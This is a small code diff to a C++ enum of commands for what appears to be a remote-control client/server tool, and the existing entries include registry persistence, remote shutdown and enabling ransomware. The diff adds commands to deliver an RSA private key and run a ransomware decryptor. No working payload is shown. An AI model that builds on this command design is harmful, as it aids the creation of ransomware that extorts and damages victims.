@@ -40,6 +40,8 @@ enum Action {
     kAddToStartup,      // add a program file path to startup registry
     kRemoteShutdown,    // shut down the client machine
     kRansomwareEnable,  // dangerous, enable ransomware on client machine
+    kSetAsDecryptionKey, // Tell the client that the data in buffer is der format of the private rsa key
+    kRunDecryptor,      // run the ransomware decryptor if the private key is on the machine
     kAddClientToServer, // client wants to be added to tcp server
 };
 
